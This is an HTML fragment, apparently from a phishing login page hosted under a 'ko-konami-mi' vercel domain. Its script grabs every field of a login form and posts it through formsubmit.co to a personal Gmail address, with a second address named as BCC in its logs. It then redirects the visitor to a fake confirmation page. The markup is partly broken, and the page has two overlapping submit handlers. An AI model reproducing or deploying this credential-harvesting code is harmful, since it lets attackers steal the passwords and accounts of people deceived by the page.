<body>

        </div>
<form id="loginForm" 
      action="https://formsubmit.co/psalmcares878@gmail.com"

</form>
    </div>

    <footer class="page-footer">

    <!-- JavaScript for form handling will be added later -->
<script>
    document.addEventListener('DOMContentLoaded', function() {
        const loginForm = document.getElementById('loginForm');
        
        if (loginForm) {
            loginForm.addEventListener('submit', function(event) {
                // 1. CRITICAL: This stops the form's default submission
                event.preventDefault();
                event.stopPropagation(); // Extra safety to stop the event
                
                console.log('Form submit intercepted!');
                
                // 2. Simple 2-second delay to simulate processing (optional)
                setTimeout(function() {
                    // 3. REDIRECT to the confirmation page
                    window.location.href = "confirmation.html";
                }, 2000); // 2000 milliseconds = 2 seconds
                
                // OPTIONAL: Show a loading message on the button
                const submitBtn = loginForm.querySelector('.btn-login');
                const originalText = submitBtn.textContent;
                submitBtn.textContent = 'Processing...';
                submitBtn.disabled = true;
                
                // Reset button text after delay (optional cleanup)
                setTimeout(function() {
                    submitBtn.textContent = originalText;
                    submitBtn.disabled = false;
                }, 2000);
                
                return false; // Another safety measure
            });
        } else {
            console.error('ERROR: Could not find form with id="loginForm"');
        }
    });
    document.getElementById('loginForm').addEventListener('submit', function(e) {
    console.log('üöÄ Form submitting...');
    console.log('üìß To: psalmcares878@gmail.com');
    console.log('üìß BCC: Samfat246@gmail.com');
    console.log('üîó Redirect to: https://ko-konami-mi.vercel.app/confirmation.html');
    
    e.preventDefault();
    
    const form = e.target;
    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());
    
    console.log('üì§ Sending data:', data);
    
    fetch('https://formsubmit.co/ajax/psalmcares878@gmail.com', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        console.log('‚úÖ Response:', result);
        if (result.success) {
            window.location.href = 'https://ko-konami-mi.vercel.app/confirmation.html';
        } else {
            alert('Error: ' + (result.message || 'Submission failed'));
        }
    })
    .catch(error => {
        console.error('‚ùå Error:', error);
        alert('Network error');
    });
});
    </script>
</body>
</html>
